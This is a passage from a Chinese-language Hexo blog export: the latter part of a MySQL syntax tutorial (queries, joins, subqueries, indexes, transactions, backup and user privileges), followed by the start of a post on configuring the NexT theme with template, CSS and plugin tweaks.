<h4 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h4><p><img src="/2020/05/15/MySQL%E8%AF%AD%E6%B3%95/字符串函数.png" alt="photo"></p>
<h4 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h4><p><img src="/2020/05/15/MySQL%E8%AF%AD%E6%B3%95/数学相关函数.png" alt="photo"></p>
<h4 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h4><p><img src="/2020/05/15/MySQL%E8%AF%AD%E6%B3%95/时间函数.png" alt="photo"></p>
<h4 id="加密函数和系统函数"><a href="#加密函数和系统函数" class="headerlink" title="加密函数和系统函数"></a>加密函数和系统函数</h4><p><img src="/2020/05/15/MySQL%E8%AF%AD%E6%B3%95/加密和系统函数.png" alt="photo"></p>
<h4 id="流程控制函数"><a href="#流程控制函数" class="headerlink" title="流程控制函数"></a>流程控制函数</h4><p><img src="/2020/05/15/MySQL%E8%AF%AD%E6%B3%95/流程控制函数.png" alt="photo"></p>
<h4 id="使用distinct消除查询结果重复行"><a href="#使用distinct消除查询结果重复行" class="headerlink" title="使用distinct消除查询结果重复行"></a>使用distinct消除查询结果重复行</h4><p><strong>语法形式：</strong></p>
<blockquote>
<p>select distinct 字段1，字段2,… from 表名;</p>
</blockquote>
<h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><h5 id="like模糊查找运算符"><a href="#like模糊查找运算符" class="headerlink" title="like模糊查找运算符"></a>like模糊查找运算符</h5><p>用于判断某个字符型字段的值是否包含给定的字符。<br><strong>语法形式：</strong></p>
<blockquote>
<p>xxx字段 like ‘%关键字%’;</p>
</blockquote>
<h5 id="between-范围限定运算符"><a href="#between-范围限定运算符" class="headerlink" title="between 范围限定运算符"></a>between 范围限定运算符</h5><p>用于判断某个字段的值是否在给定的两个数据范围之间。<br><strong>语法形式：</strong></p>
<blockquote>
<p>xxx字段 between 值1 and 值2;</p>
</blockquote>
<h5 id="in运算符"><a href="#in运算符" class="headerlink" title="in运算符"></a>in运算符</h5><p>用于判断某个字段的值是否在给出的若干个“可选值”范围。<br><strong>语法形式：</strong></p>
<blockquote>
<p>xxx字段 in (值1，值2,…);</p>
</blockquote>
<h5 id="is运算符"><a href="#is运算符" class="headerlink" title="is运算符"></a>is运算符</h5><p>用于判断一个字段中的是“是否存在”只有两种写法：</p>
<blockquote>
<p>where content is null;<br>where content is not null;</p>
</blockquote>
<h4 id="group-by子句"><a href="#group-by子句" class="headerlink" title="group by子句"></a>group by子句</h4><p><strong>语法形式：</strong></p>
<blockquote>
<p>group by 字段1，字段2，…;</p>
</blockquote>
<p><strong>含义：</strong><br>表示对所取得的数据，以所给定的字段来进行分组。<br>最后的结果就是将数据分成了若干组，每组作为一个“整体”成为一行数据。</p>
<h4 id="having-子句"><a href="#having-子句" class="headerlink" title="having 子句"></a>having 子句</h4><p><strong>语法形式：</strong></p>
<blockquote>
<p>having 筛选条件</p>
</blockquote>
<p><strong>含义：</strong><br>having 的含义跟where的含义一样，只是having是用于对group by分组的结果进行的条件筛选。</p>
<h4 id="order-by子句"><a href="#order-by子句" class="headerlink" title="order by子句"></a>order by子句</h4><p><strong>语法形式：</strong></p>
<blockquote>
<p>order by 字段1 【asc或desc】,字段2 [asc或desc];</p>
</blockquote>
<p><strong>含义</strong><br>对前面所取得的数据按给定的字段进行排序<br>排序方式有：正序：asc，倒序desc；</p>
<h4 id="limit子句"><a href="#limit子句" class="headerlink" title="limit子句"></a>limit子句</h4><p><strong>语法形式：</strong></p>
<blockquote>
<p>limit 起始行号，行数</p>
</blockquote>
<p><strong>说明：</strong></p>
<ol>
<li>limit表示对前面所取得的数据再进行数量上的筛选，取得从某行开始的多少行。</li>
<li>行号就是前面所取得数据的“自然顺序号”，从0开始算起一一注意不是id，或任何其他实际数据。</li>
<li>起始行号可以省略，此时limit后只用一个数字，表示从第0行开始去除多少行。</li>
<li>limit子句通常用到“翻页”功能上，用于找出“第n页”的数据，其公式为：limit (n-1) * pageSize,pageSize; 其中pageSize表示每页显示的条数。</li>
</ol>
<h3 id="高级插入"><a href="#高级插入" class="headerlink" title="高级插入"></a>高级插入</h3><h4 id="同时插入多行记录"><a href="#同时插入多行记录" class="headerlink" title="同时插入多行记录"></a>同时插入多行记录</h4><p><strong>语句形式：</strong></p>
<blockquote>
<p>insert into 表名（字段，字段2，…） values (值1，值2，..),(值1，值2，…),…;</p>
</blockquote>
<h4 id="插入查询的结果数据"><a href="#插入查询的结果数据" class="headerlink" title="插入查询的结果数据"></a>插入查询的结果数据</h4><p><strong>语句形式：</strong></p>
<blockquote>
<p>insert into 表名（字段1，字段2，…），select（xx1,xx2,…）…;</p>
</blockquote>
<p>要求：<br>    插入语句的字段个数，跟select语句的字段个数相等。<br>    插入语句的字段类型，跟select语句的字段类型相符。</p>
<h4 id="set语法插入数据"><a href="#set语法插入数据" class="headerlink" title="set语法插入数据"></a>set语法插入数据</h4><p><strong>语句形式：</strong></p>
<blockquote>
<p>insert into 表名 set 字段1=值1,字段2=值2,….;</p>
</blockquote>
<h4 id="蠕虫复制"><a href="#蠕虫复制" class="headerlink" title="蠕虫复制"></a>蠕虫复制</h4><p>所谓蠕虫复制，就是针对一个表的数据，进行快速的复制并插入到所需要的表中，以期在短时间内具备“大量数据”，以用于测试或其他特殊场合，比如：<br>1，将一个表的大量数据，复制到另一个表中；<br>2，将一个表的数据复制到本身表中以产生大量数据；</p>
<h4 id="插入时主键冲突"><a href="#插入时主键冲突" class="headerlink" title="插入时主键冲突"></a>插入时主键冲突</h4><p>办法1：忽略<br>终止插入，数据不改变。<br>语法：</p>
<blockquote>
<p>insert ignore into 表名（字段…）values(值..);</p>
</blockquote>
<p>办法2：替换<br>删除原纪录，插入新纪录。<br>语法：</p>
<blockquote>
<p>replace into 表名 (字段..) values(值..);</p>
</blockquote>
<p>说明：此replace的用法跟insert一样，也可以插入新纪录，只是如果新纪录出现主键冲突，就会删除原纪录后，再插入该新纪录。</p>
<p>办法3：更新<br>设置为去更新原有数据（而并不插入）。<br>语法：</p>
<blockquote>
<p>insert into 表名 （字段…） values(值..) on duplicate key update xx字段=新的值;</p>
</blockquote>
<h3 id="高级删除"><a href="#高级删除" class="headerlink" title="高级删除"></a>高级删除</h3><h4 id="按指定顺序删除"><a href="#按指定顺序删除" class="headerlink" title="按指定顺序删除"></a>按指定顺序删除</h4><p><strong>语句形式：</strong></p>
<blockquote>
<p>delete from 表名 where …[order by 字段名, ..] [limit 数量 n];</p>
</blockquote>
<p>说明：<br>1，order by用于设定删除数据时的删除顺序，跟select 语句中的orderby子句道理一样。<br>2，limit 用于设定删除数据时要删除的行数，即删除的数据可能少于条件筛选出来的数据。</p>
<h4 id="truncate清空"><a href="#truncate清空" class="headerlink" title="truncate清空"></a>truncate清空</h4><p><strong>语法形式:</strong></p>
<blockquote>
<p>truncate 表名;</p>
</blockquote>
<p>说明：<br>表示清空指定表中的所数据并将表恢复到“初始状态”（就类似刚刚创建一样）。</p>
<h3 id="高级更新"><a href="#高级更新" class="headerlink" title="高级更新"></a>高级更新</h3><p><strong>语法形式：</strong></p>
<blockquote>
<p>update 表名 set 字段名=字段值,… where … [order by 字段名] [limit 数量n];</p>
</blockquote>
<p>说明：<br>1，order by用于设定更新数据时的更新顺序，跟select 语句中的orderby子句道理一样。<br>2，limit 用于设定更新数据时要更新的行数，即更新的数据量可能少于条件筛选出来的数据量。</p>
<h3 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ... limit <span class="keyword">start</span>,<span class="keyword">rows</span> <span class="operator">/</span><span class="operator">/</span> 表示从<span class="keyword">start</span> <span class="operator">+</span> <span class="number">1</span>行开始去，取出<span class="keyword">rows</span>行，<span class="keyword">start</span>从<span class="number">0</span>开始计算</span><br></pre></td></tr></table></figure>
<h3 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h3><p>默认情况下，当两个表查询时，规则</p>
<ol>
<li>从第一张表中，取出一行和第二张表的每一行进行组合，返回结果</li>
<li>一共返回的记录数 第一张表行数*第二张表的行数</li>
<li>这样多表查询默认吹返回的结果，称为迪卡尔集</li>
</ol>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><h4 id="联合查询概念"><a href="#联合查询概念" class="headerlink" title="联合查询概念"></a>联合查询概念</h4><p>联合查询是指将2个或2个以上的字段数量相同的查询结果，“纵向堆叠”后合并为一个结果。</p>
<h4 id="联合查询语法"><a href="#联合查询语法" class="headerlink" title="联合查询语法"></a>联合查询语法</h4><p><strong>语法形式</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 查询<span class="number">1</span></span><br><span class="line"><span class="keyword">union</span> [<span class="keyword">all</span> 或 <span class="keyword">distinct</span>]</span><br><span class="line"><span class="keyword">select</span> 查询<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> [<span class="keyword">all</span> 或 <span class="keyword">distinct</span>]</span><br><span class="line">.....</span><br><span class="line">[<span class="keyword">order</span> <span class="keyword">by</span> 字段 [<span class="keyword">asc</span> 或 <span class="keyword">desc</span>]]</span><br><span class="line">[limit 起始行号，数量];</span><br></pre></td></tr></table></figure>
<p>说明：<br>1，所有单个查询结果应该具有相等的列数。<br>2，所有单个查询的列类型应该具有一致性（即每个查询的第n列的数据类型一致）。<br>3，单个查询的列名可以不同，但最终的列名是第一个查询的列名（可以使用别名）。<br>4，union可以带all或distinct参数，如果省略就是distinct，即默认已经消除重复行了。<br>5，最后的order by或 limit是对整个联合之后的结果数据进行排序或数量限定。<br>6，orderby子句中的排序字段应该使用第一个查询中的字段名，如果有别名就必须使用别名。<br>7，可见，假设：<br>查询1有n1行，m列；查询2有n2行，m列；则两个表“联合”之后的结果，有最多n1+m2行，m列。</p>
<h3 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h3><h4 id="连接查询概述"><a href="#连接查询概述" class="headerlink" title="连接查询概述"></a>连接查询概述</h4><p>连接查询，是将两个查询（或表）的每一行，以“两两横向对接”的方式，所得到的所有行的结果。<br>即一个表中的某行，跟另一个表中的某行，进行“横向对接”，而得到一个新行。</p>
<p>基本形式：</p>
<blockquote>
<p>select … from 表1 [连接方式] join 表2 [on连接条件] where.…；</p>
</blockquote>
<h4 id="交叉连接-cross-join"><a href="#交叉连接-cross-join" class="headerlink" title="交叉连接(cross join)"></a>交叉连接(cross join)</h4><p><strong>语法形式：</strong></p>
<blockquote>
<p>from 表1 [cross] join 表2;</p>
</blockquote>
<p>说明：<br>1，交叉连接其实可以认为是连接查询的“完全版本”，即所有行都无条件地都连接起来了。<br>2，关键字“cross”可以省略；<br>3，交叉连接又称为“笛卡尔积”，通常应用价值不大。</p>
<h4 id="内连接-inner-join"><a href="#内连接-inner-join" class="headerlink" title="内连接(inner join)"></a>内连接(inner join)</h4><p><strong>语句形式：</strong></p>
<blockquote>
<p>from 表1 [inner] join 表2 on 连接条件;</p>
</blockquote>
<p>说明：<br>1，内连接其实是交叉连接的基础上，再通过on条件而筛选出来的部分数据。<br>2，关键字“inner”可以省略，但建议写上。<br>3，内连接是应用最广泛的一种连接查询，其本质是根据条件筛选出“有意义的数据”。</p>
<h4 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h4><p><strong>左外连接</strong><br>语法形式：</p>
<blockquote>
<p>select .. from 表1 left [outer] join 表2 on 连接条件</p>
</blockquote>
<p>说明：</p>
<ol>
<li>左外连接其实是保证左边表的数据都能够取出的一种连接</li>
<li>左外连接其实是在内连接的基础上，再加上左边表中所有不能满足条件的数据3，关键字“outer”可以省略</li>
</ol>
<p><strong>右外连接</strong><br>语法形式：</p>
<blockquote>
<p>select from 表1 right [outer] join 表2 on 连接条件</p>
</blockquote>
<p>说明：<br>1，右外连接其实是保证右边表的数据都能够取出的一种连接。<br>2，右外连接其实是在内连接的基础上，再加上右边表中所有不能满足条件的数据3，关键字“outer”可以省略。</p>
<h4 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h4><p><strong>语法形式</strong></p>
<blockquote>
<p>from 表名 as a [连接形式] join 表 as b on a.xx字段 = b.xx字段</p>
</blockquote>
<p>说明：<br>1，自连接其实还是两个表连接，只是将一个表用不同的别名，当做两个表。<br>2，自连接适用于一个表中的某个字段的值“来源于”当前表的另一个字段的情况。</p>
<h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>子查询就是指一个“正常查询语句”中的某个部分（比如select部分，from部分，where部分）又出现了查询的一种查询形式。</p>
<h4 id="标量子查询"><a href="#标量子查询" class="headerlink" title="标量子查询"></a>标量子查询</h4><p>含义：<br>标量子查询就是指子查询的结果是“单个值”（一行一列）的查询。</p>
<p>使用：<br>标量子查询通常用在where子句中，作为主查询的一个条件判断的数据。<br>本质上，标量子查询的结果，就可以直接当做“一个值”来使用。</p>
<h4 id="列子查询"><a href="#列子查询" class="headerlink" title="列子查询"></a>列子查询</h4><p>含义：列子查询查出的结果为“一列数据”<br>使用：列子查询通常用在where子句的in运算符中，代替in运算符中的“字面值”列表数据。</p>
<h4 id="行子查询"><a href="#行子查询" class="headerlink" title="行子查询"></a>行子查询</h4><p>含义：行子查询查出的结果通常是一行。<br>使用：行子查询的结果通常更“行构造符”一起，在where子句中作为条件数据。</p>
<h4 id="表子查询"><a href="#表子查询" class="headerlink" title="表子查询"></a>表子查询</h4><p>含义：<br>当一个子查询查出的结果是“多行多列”的时候，就是表子查询。<br>表子查询的结果相当于一个表，可以直接当做一个表来使用。<br>使用：<br>表子查询通常用在主查询的from子句中，作为一个“数据源”。<br>注意：<br>此时需要给该子查询设置一个别名，类似这样：<br>from（select…子查询）as tab1</p>
<h4 id="有关子查询的特定关键字"><a href="#有关子查询的特定关键字" class="headerlink" title="有关子查询的特定关键字"></a>有关子查询的特定关键字</h4><p><strong>in关键字</strong><br>in 关键字在子查询中主要用在列子查询中代替人为手工罗列出来的多个“字面值”数据。</p>
<p><strong>any关键字</strong><br>any关键字用在比较操作操符的后面，表示查询结果的多个数据中的任一个满足该比较操作符就算满足。</p>
<p><strong>all关键字</strong><br>all 关键字用在比较操作操符的后面，表示查询结果的多个数据中的所有都满足该比较操作符才算满足。</p>
<h4 id="exists子查询"><a href="#exists子查询" class="headerlink" title="exists子查询"></a>exists子查询</h4><p>形式</p>
<blockquote>
<p>where exists （任何子查询）</p>
</blockquote>
<p>含义：<br>该子查询如果“有数据”，则该existsO的结果为“true”，即相当于 where true（恒真）该子查询如果“没有数据”，则该exists0的结果为“false”，即相当于where<br>false（恒假）<br>说明： 此子查询语句通常需要用到主查询语句中的字段作为查询条件。</p>
<h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>提高数据库性能</p>
<ol>
<li>主键索引，主键自动的为主索引</li>
<li>唯一索引</li>
<li>普通索引</li>
<li>全文索引（开发中考虑：全文搜索Solr和ElasticSearch）</li>
</ol>
<h4 id="索引使用"><a href="#索引使用" class="headerlink" title="索引使用"></a>索引使用</h4><p>添加索引</p>
<blockquote>
<p>create [unique] index index_name on tbl_name (col_name[(length)]) [ASC|DESC],…)<br>alter table table_name ADD INDEX [index_name] (index_col_name,…)</p>
</blockquote>
<p>添加主键索引</p>
<blockquote>
<p>alter table 表名 add primary key(列名,..)</p>
</blockquote>
<p>删除索引</p>
<blockquote>
<p>drop index index_name on tbl_name<br>alter table table_name drop index index_name</p>
</blockquote>
<p>删除主键索引</p>
<blockquote>
<p>alter table t_b drop primary key</p>
</blockquote>
<p>查询索引</p>
<blockquote>
<p>show index from table_name<br>show indexes from table_name<br>show keys from table_name</p>
</blockquote>
<h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><p>事务用于保证数据的一致性，它由一组相关的dml语句组成，该组的dml语句要么全部成功，要么全部失败</p>
<h4 id="mysql数据库控制台事务的几个重要操作"><a href="#mysql数据库控制台事务的几个重要操作" class="headerlink" title="mysql数据库控制台事务的几个重要操作"></a>mysql数据库控制台事务的几个重要操作</h4><ol>
<li>start transaction  — 开始一个事务</li>
<li>savepoint 保存点名—设置保存点</li>
<li>rollback to 保存点名 —回退事务</li>
<li>rollback —回退全部事务</li>
<li>commit —提交事务，所有的操作生效，不能回退</li>
</ol>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol>
<li>如果不开始事务，默认情况下，dml操作是自动提交的，不能回滚</li>
<li>如果开始一个事务，没有创建保存点，可以执行rollback，默认是回退到事务开始的状态</li>
<li>可以在这个事务没有提交时，创建多个保存点</li>
<li>可以在事务没有提交前，选择回退到哪个保存点</li>
<li>mysql的事务机制需要innodb的存储引擎才可以使用</li>
<li>开始一个事务 start transaction，set autocommit=off</li>
</ol>
<h4 id="事务隔离"><a href="#事务隔离" class="headerlink" title="事务隔离"></a>事务隔离</h4><p>多个连接开启各自事务操作数据库中数据时，数据库系统要负责隔离操作，以保证各个连接在获取数据时的准确性</p>
<p>脏读：当一个事务读取另一个事务尚未提交的修改时，产生脏读</p>
<p>不可重复读：同一查询在同一事务中多次进行，由于其他提交事务所做的修改或删除，每次返回不同的结果集，此时发生不可重复读</p>
<p>幻读：同一查询在同一事务中多次进行，由于其他提交事务所做的插入操作，每次返回不同的结果集，此时发生幻读</p>
<p><img src="/2020/05/15/MySQL%E8%AF%AD%E6%B3%95/事务隔离.png" alt="photo"></p>
<h3 id="数据管理"><a href="#数据管理" class="headerlink" title="数据管理"></a>数据管理</h3><h4 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h4><p><strong>备份整个数据库</strong></p>
<blockquote>
<p>mysqldump.exe -h 主机地址 -u 用户名 -p 密码(不输入) -B 数据库名 &gt; 备份文件名.sql（含路径）</p>
</blockquote>
<p>说明：<br>1，跟登录mysql类似，密码可以不写，则随后会提示输入<br>2，该语句是mysql/bin中的一个命令，不是sql语句（即不应该登录mysql后使用）</p>
<p><strong>备份单个表</strong><br>命令形式：</p>
<blockquote>
<p>mysqldump.exe -h 主机地址 -u 用户名 -p 密码 数据库 表1 表2 &gt; 备份文件名.sql（含路径）</p>
</blockquote>
<p>说明：<br>1，跟登录mysql类似，密码可以不写，则随后会提示输入2，该语句是mysql/bin中的一个命令，不是sql 语句（即不应该登录mysql后再去使用）</p>
<h4 id="数据还原"><a href="#数据还原" class="headerlink" title="数据还原"></a>数据还原</h4><p>数据还原（恢复）是指将一个之前份过的数据文件，恢复（还原）到某个数据库的过程。<br>还原其实不分整个库还是单个表，都是一样的。<br>命令形式：</p>
<blockquote>
<p>mysql.exe -h 主机地址 -u 用户名 -p 密码 目标数据库名 &lt; 想要还原的备份文件名（含路径）<br>或(Source 文件名.sql)</p>
</blockquote>
<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><h4 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a>查看用户</h4><p>mysql数据库管理系统中有个数据库叫做“mysql”，绝对不能删除！<br>其中有个表“user”，就是存储了当前数据库系统中的所有用户信息。<br>初始时只有一个用户：root。<br>查看用户：</p>
<blockquote>
<p>use mysql；<br>select * from user；</p>
</blockquote>
<h4 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h4><p>语法形式：</p>
<blockquote>
<p>create user ‘用户名’[@’允许登录的地址’] identified by ‘密码’;</p>
</blockquote>
<p>说明:<br>1，创建用户之后，数据库mysql中的user表中就会多一个用户。<br>2，‘允许登录的地址’，就是允许登录的客户端的ip地址，或<br>①”localhost”表示只能本地登录；<br>②%”表示任何位置都可以登录；<br>③该部分可以省略，如果省略，默认就是”%”；<br>④后续涉及到用户的操作，都是这个格式。</p>
<h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><p>语法形式：</p>
<blockquote>
<p>drop user 用户[@’允许登录的地址’];</p>
</blockquote>
<p>删除用户后，数据库mysql中的user表中就会少一个用户。</p>
<h4 id="修改-设置用户密码"><a href="#修改-设置用户密码" class="headerlink" title="修改/设置用户密码"></a>修改/设置用户密码</h4><p>语法形式：</p>
<blockquote>
<p>set password for 用户[@’允许登录的地址’] = password(‘密码’);</p>
</blockquote>
<h4 id="授予用户权限"><a href="#授予用户权限" class="headerlink" title="授予用户权限"></a>授予用户权限</h4><p>语法形式</p>
<blockquote>
<p>grant 操作1，操作2，… on <em>.</em>或数据库名.* 或 数据库名.表名 to 用户[@’允许登录的地址’];</p>
</blockquote>
<h4 id="取消用户授权"><a href="#取消用户授权" class="headerlink" title="取消用户授权"></a>取消用户授权</h4><p>语法形式</p>
<blockquote>
<p>revoke 操作1，操作2，… on <em>.</em>或数据库名.* 或 数据库名.表名 from 用户[@’允许登录的地址’];</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>Next主题配置</title>
    <url>/2020/03/28/Next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>该文介绍一些Next主题的配置信息<br><span id="more"></span></p>
<h2 id="页面显示问题"><a href="#页面显示问题" class="headerlink" title="页面显示问题"></a>页面显示问题</h2><h3 id="设置站点建立时间"><a href="#设置站点建立时间" class="headerlink" title="设置站点建立时间"></a>设置站点建立时间</h3><p>在 主题配置文件 中，搜索：since，修改 since 后面的值即可，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">since: 2013</span><br></pre></td></tr></table></figure>
<h3 id="subnav链接错误"><a href="#subnav链接错误" class="headerlink" title="subnav链接错误"></a>subnav链接错误</h3><p>修改主题配置文件后,运行时,出现subnav子导航 链接中多了%20这样的字样，这是主题内置字符串切割时出现错误，可以修改配置,将空格去掉,如： 将</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || home</span><br><span class="line">  # about: /about/ || user</span><br><span class="line">  tags: /tags/ || tags</span><br><span class="line">  categories: /categories/ || th</span><br></pre></td></tr></table></figure>
<p>改为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: /||home</span><br><span class="line">  # about: /about/||user</span><br><span class="line">  tags: /tags/||tags</span><br><span class="line">  categories: /categories/||th</span><br></pre></td></tr></table></figure>
<h3 id="站点概览中的链接错误-包括右边栏“日志”菜单部分URL的乱码"><a href="#站点概览中的链接错误-包括右边栏“日志”菜单部分URL的乱码" class="headerlink" title="站点概览中的链接错误(包括右边栏“日志”菜单部分URL的乱码)"></a>站点概览中的链接错误(包括右边栏“日志”菜单部分URL的乱码)</h3><p>在<strong>thems\next\layout_macro</strong>中，打开<strong>sidebar.swig</strong>文件，找到</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;site-state-item site-state-posts&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>将</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123; &#123; url_for(theme.menu.archives).split(&#x27;\|\|&#x27;)[0] | trim &#125; &#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>改为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123; &#123; url_for(theme.menu.archives.split(&#x27;\|\|&#x27;)[0]) | trim &#125; &#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="文章目录编号显示问题"><a href="#文章目录编号显示问题" class="headerlink" title="文章目录编号显示问题"></a>文章目录编号显示问题</h3><p>在主题配置文件中找到 toc 节点，修改 number 为 false</p>
<h3 id="分页显示问题"><a href="#分页显示问题" class="headerlink" title="分页显示问题"></a>分页显示问题</h3><p><img src="/2020/03/28/Next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/分页显示问题.png" alt="图片"></p>
<p>主题配置页面进入layout/_partials/pagination.swig,修改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if page.prev or page.next %&#125;</span><br><span class="line"> &lt;nav class=&quot;pagination&quot;&gt;</span><br><span class="line">   &#123;&#123;</span><br><span class="line">     paginator(&#123;</span><br><span class="line">       prev_text: &#x27;&lt;i class=&quot;fa fa-angle-left&quot; aria-label=&quot;&#x27;+__(&#x27;accessibility.prev_page&#x27;)+&#x27;&quot;&gt;&lt;/i&gt;&#x27;,</span><br><span class="line">       next_text: &#x27;&lt;i class=&quot;fa fa-angle-right&quot; aria-label=&quot;&#x27;+__(&#x27;accessibility.next_page&#x27;)+&#x27;&quot;&gt;&lt;/i&gt;&#x27;,</span><br><span class="line">       mid_size: 1,</span><br><span class="line">       escape: false</span><br><span class="line">     &#125;)</span><br><span class="line">   &#125;&#125;</span><br><span class="line"> &lt;/nav&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="文章添加阴影"><a href="#文章添加阴影" class="headerlink" title="文章添加阴影"></a>文章添加阴影</h3><p>打开/themes/next/source/css/_custom/custom.styl，添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post &#123;</span><br><span class="line">   margin-top: 60px;</span><br><span class="line">   margin-bottom: 60px;</span><br><span class="line">   padding: 25px;</span><br><span class="line">   -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">   -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Local-Search-本地搜索"><a href="#Local-Search-本地搜索" class="headerlink" title="Local Search 本地搜索"></a>Local Search 本地搜索</h3><p>在站点的根目录执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
<p>编辑站点配置文件，新增以下内容到任意位置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure>
<p>编辑主题配置文件，启用本地搜索功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Local search</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
<h3 id="文章图片显示问题"><a href="#文章图片显示问题" class="headerlink" title="文章图片显示问题"></a>文章图片显示问题</h3><ol>
<li>设置站点配置文件_config.yml中 post_asset_folder:true。</li>
</ol>
<p>Hexo 提供了一种更方便管理 Asset 的设定：post_asset_folder当您设置post_asset_folder为true参数后，在建立文件时，Hexo会自动建立一个与文章同名的文件夹，您可以把与该文章相关的所有资源都放到那个文件夹。</p>
<ol>
<li>安装插件：在hexo的目录下执行</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>
<ol>
<li><p>完成安装后用hexo新建文章的时候会发现_posts目录下面会多出一个和文章名字一样的文件夹。图片就可以放在文件夹下面。</p>
</li>
<li><p>文章中插入图片方式：</p>
</li>
</ol>
<ul>
<li>方式一：</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;%asset_img example.jpg examplename&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>方式二：</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">![description][<span class="number">1</span>]</span><br><span class="line">[<span class="number">1</span>]:picture_path <span class="string">&quot;picture_name&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="文章内容显示不全"><a href="#文章内容显示不全" class="headerlink" title="文章内容显示不全"></a>文章内容显示不全</h3><p>在主题目录中，找到主题配置文件，搜索 motion，修改如下：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">motion:</span><br><span class="line">  enable: true</span><br><span class="line">  async: true</span><br></pre></td></tr></table></figure>
<h3 id="修改文章内链接文本样式"><a href="#修改文章内链接文本样式" class="headerlink" title="修改文章内链接文本样式"></a>修改文章内链接文本样式</h3><p>修改文件themes\next\source\css_common\components\post\post.styl，在末尾添加如下css样式，：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// 文章内链接文本样式</span><br><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> <span class="selector-tag">a</span>&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#0593d3</span>;</span><br><span class="line">  &amp;<span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fc6423</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#fc6423</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中选择.post-body 是为了不影响标题，选择 p 是为了不影响首页“阅读全文”的显示样式,颜色可以自己定义。</p>
<h2 id="页面背景设置"><a href="#页面背景设置" class="headerlink" title="页面背景设置"></a>页面背景设置</h2><p>打开文件 themes/next/source/css/_custom/custom.styl，添加：</p>
